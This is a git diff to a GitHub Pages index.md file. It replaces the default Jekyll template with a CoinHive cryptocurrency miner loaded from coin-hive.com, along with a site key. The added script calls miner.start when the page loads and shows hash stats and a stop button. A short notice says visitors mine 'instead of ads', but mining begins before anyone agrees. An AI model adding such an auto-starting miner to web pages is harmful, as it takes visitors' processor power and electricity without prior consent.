@@ -1,38 +1,39 @@
 ## Welcome to GitHub Pages
-1111111111111111111111111111111111111
+1<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+Instead of using ads, I am having you mine for crypto currency to support this site. Here are your stats:
+<center>
+<p id="tcount"></p>
+<p id="hps"></p>
+<p id="ths"></p>
+<p id="tah"></p>
+</center>
+<p>You can start or stop at anytime but please wait for some accepted hashes before you do.</p>
+<center>
+<p id="minebutton"></p>
+</center>
+<p>Visit <a href="https://coin-hive.com/">Coin Hive</a> to learn more about how this works</a>
 
-You can use the [editor on GitHub](https://github.com/MinerDeveloper/Miner.github.io/edit/master/index.md) to maintain and preview the content for your website in Markdown files.
-
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
-
-### Markdown
-
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
-
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/MinerDeveloper/Miner.github.io/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Sზურააააააა
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script type="text/javascript">
+var miner = new CoinHive.Anonymous('oXdqhulPqxBSCSnEX3WNJ88eMzUbsAFG','threads: 1');
+miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+// Update stats once per second
+setInterval(function() {
+    var threadCount = miner.getNumThreads();
+    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes() / 256;
+    // Output to HTML elements...
+    if (miner.isRunning()) {
+        document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
+        document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
+        document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
+        document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
+        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
+    } else {
+        document.getElementById("hps").innerHTML = "Please click start";
+        document.getElementById("ths").innerHTML = "to support";
+        document.getElementById("tah").innerHTML = "this site";
+        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
+    }
+}, 1000);
+</script>
